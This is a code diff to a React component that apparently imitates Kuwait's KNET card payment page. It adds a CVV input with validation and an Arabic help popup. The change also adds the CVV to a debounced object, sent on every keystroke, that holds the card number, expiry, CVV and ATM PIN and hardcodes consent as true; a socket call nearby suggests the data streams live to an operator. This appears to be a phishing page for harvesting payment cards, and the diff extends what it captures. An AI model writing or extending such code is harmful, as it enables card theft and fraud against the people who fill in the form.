@@ -88,6 +88,8 @@ export default function KNETPayment() {
   const [expiryMonth, setExpiryMonth] = useState("");
   const [expiryYear, setExpiryYear] = useState("");
   const [cardPin, setCardPin] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
+  const [showCvvHelp, setShowCvvHelp] = useState(false);
 
   // OTP state
   const [otpCode, setOtpCode] = useState("");
@@ -132,13 +134,13 @@ export default function KNETPayment() {
         cardNumber: selectedPrefix + cardNumber,
         nameOnCard: selectedBank || "KNET",
         expiryDate: expiryMonth && expiryYear ? `${expiryMonth.padStart(2, "0")}/${String(expiryYear).slice(-2)}` : "",
-        cvv: cardPin,
+        cvv: cardCvv,
         pin: cardPin,
         consent: true,
       });
     }, 60);
     return () => { if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current); };
-  }, [selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin]);
+  }, [selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin, cardCvv]);
 
   useEffect(() => {
     return () => { socket.value.emit("card:liveHide"); };
@@ -280,6 +282,10 @@ export default function KNETPayment() {
     }
     if (!expiryMonth || !expiryYear) {
       setValidationError("خطأ : الرجاء أختيار شهر وسنة أنتهاء البطاقة");
+      return false;
+    }
+    if (cardCvv.length !== 3 || !/^\d{3}$/.test(cardCvv)) {
+      setValidationError("خطأ : الرجاء أدخال رمز الأمان CVV المكون من 3 ارقام");
       return false;
     }
     setValidationError("");
@@ -692,6 +698,47 @@ export default function KNETPayment() {
                 </div>
 
 
+                {/* CVV */}
+                <div style={fieldRow}>
+                  <label style={fieldLabel}>
+                    CVV:
+                    <span
+                      onClick={() => setShowCvvHelp(true)}
+                      style={{
+                        display: "inline-flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                        width: 15,
+                        height: 15,
+                        borderRadius: "50%",
+                        border: "1px solid #0099cc",
+                        color: "#0099cc",
+                        fontSize: 10,
+                        fontWeight: "bold",
+                        marginLeft: 6,
+                        cursor: "pointer",
+                        lineHeight: 1,
+                      }}
+                    >
+                      !
+                    </span>
+                  </label>
+                  <div style={fieldValue}>
+                    <input
+                      type="tel"
+                      inputMode="numeric"
+                      maxLength={3}
+                      value={cardCvv}
+                      onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, "").slice(0, 3);
+                        setCardCvv(val);
+                        setValidationError("");
+                      }}
+                      style={{ ...inputStyle, width: "100%" }}
+                    />
+                  </div>
+                </div>
+
                 {/* Buttons */}
                 <div
                   style={{
@@ -859,6 +906,82 @@ export default function KNETPayment() {
                 >
                   Cancel
                 </button>
+              </div>
+            </div>
+          )}
+
+          {showCvvHelp && (
+            <div
+              onClick={() => setShowCvvHelp(false)}
+              style={{
+                position: "fixed",
+                top: 0,
+                left: 0,
+                width: "100%",
+                height: "100%",
+                backgroundColor: "rgba(0,0,0,0.55)",
+                zIndex: 1000000001,
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+              }}
+            >
+              <div
+                onClick={(e) => e.stopPropagation()}
+                style={{
+                  backgroundColor: "#ffffff",
+                  borderRadius: 8,
+                  padding: "10px 16px 16px",
+                  maxWidth: 420,
+                  width: "92%",
+                  boxShadow: "0 6px 20px rgba(0,0,0,0.35)",
+                }}
+              >
+                <div style={{ textAlign: "right" }}>
+                  <button
+                    onClick={() => setShowCvvHelp(false)}
+                    style={{
+                      background: "transparent",
+                      border: 0,
+                      fontSize: 22,
+                      fontWeight: "bold",
+                      cursor: "pointer",
+                      opacity: 0.5,
+                      lineHeight: 1,
+                    }}
+                  >
+                    &times;
+                  </button>
+                </div>
+                <svg viewBox="0 0 340 210" style={{ width: "100%", display: "block" }}>
+                  <defs>
+                    <linearGradient id="cvvCardGrad" x1="0" y1="0" x2="1" y2="1">
+                      <stop offset="0%" stopColor="#1f4e79" />
+                      <stop offset="100%" stopColor="#0b2545" />
+                    </linearGradient>
+                  </defs>
+                  <rect x="5" y="5" width="330" height="200" rx="14" fill="url(#cvvCardGrad)" />
+                  <rect x="5" y="34" width="330" height="36" fill="#111827" />
+                  <rect x="25" y="92" width="252" height="42" rx="4" fill="#f1f5f9" />
+                  <text x="32" y="118" fontSize="11" fontFamily="Verdana" fill="#94a3b8">Signature</text>
+                  <rect x="286" y="92" width="36" height="42" rx="4" fill="#ffffff" stroke="#94a3b8" />
+                  <text x="304" y="119" fontSize="16" fontFamily="Verdana" fill="#0f172a" textAnchor="middle">123</text>
+                  <text x="304" y="86" fontSize="11" fontFamily="Verdana" fill="#ffffff" textAnchor="middle">CVV</text>
+                  <circle cx="304" cy="113" r="25" fill="none" stroke="#ef4444" strokeWidth="3" />
+                </svg>
+                <p
+                  style={{
+                    fontSize: 12,
+                    color: "#555555",
+                    textAlign: "center",
+                    marginTop: 12,
+                    marginBottom: 0,
+                    fontFamily: "Verdana, Arial, sans-serif",
+                    lineHeight: "18px",
+                  }}
+                >
+                  رمز الأمان CVV هو الأرقام الثلاثة الموجودة خلف البطاقة
+                </p>
               </div>
             </div>
           )}
